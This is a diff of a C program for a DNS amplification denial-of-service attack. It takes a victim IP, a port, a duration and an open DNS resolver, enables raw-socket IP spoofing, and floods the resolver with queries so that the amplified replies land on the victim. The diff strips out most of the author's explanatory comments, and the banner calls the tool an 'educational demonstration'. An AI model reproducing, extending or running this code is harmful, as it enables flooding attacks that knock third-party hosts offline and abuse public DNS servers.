@@ -33,37 +33,25 @@ unsigned char dns_query[] = {
     0x00, 0x01   // Class: IN
 };
 
-void *dns_amplification(void *arg) {
-    // github.com/scallydima - amplification thread
+void *dns_amplification(void *arg) { // spoofing ip brat
     amp_params *params = (amp_params *)arg;
-    
     int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (sock < 0) return NULL;
-    
-    // github.com/scallydima - spoofed source IP (victim)
     struct sockaddr_in victim_addr;
     victim_addr.sin_family = AF_INET;
     victim_addr.sin_port = htons(params->target_port);
     victim_addr.sin_addr.s_addr = inet_addr(params->target_ip);
-    
-    // github.com/scallydima - connect to DNS server
     struct sockaddr_in dns_addr;
     dns_addr.sin_family = AF_INET;
     dns_addr.sin_port = htons(53);
     dns_addr.sin_addr.s_addr = inet_addr(params->dns_server);
-    
-    // github.com/scallydima - enable IP spoofing
     int one = 1;
     setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
     
     time_t end_time = time(NULL) + params->duration;
-    
-    // github.com/scallydima - amplification loop
     while (time(NULL) < end_time) {
-        // Send spoofed DNS query
         sendto(sock, dns_query, sizeof(dns_query), 0,
                (struct sockaddr *)&dns_addr, sizeof(dns_addr));
-        // Response goes to victim (amplified ~50x)
     }
     
     close(sock);
@@ -71,7 +59,6 @@ void *dns_amplification(void *arg) {
 }
 
 int main(int argc, char *argv[]) {
-    // github.com/scallydima - dns amplification tool
     if (argc != 5) {
         printf("Usage: %s <VICTIM_IP> <PORT> <TIME> <DNS_SERVER>\n", argv[0]);
         printf("github.com/scallydima - demonstrate amplification attacks\n");
@@ -89,11 +76,10 @@ int main(int argc, char *argv[]) {
     printf("[+] Victim: %s:%d\n", params.target_ip, params.target_port);
     printf("[+] Using DNS server: %s\n", params.dns_server);
     printf("[+] github.com/scallydima - educational demonstration\n");
-    
-    // github.com/scallydima - single thread is enough for amplification
     pthread_t thread;
     pthread_create(&thread, NULL, dns_amplification, &params);
     pthread_join(thread, NULL);
     
     return 0;
+
 }
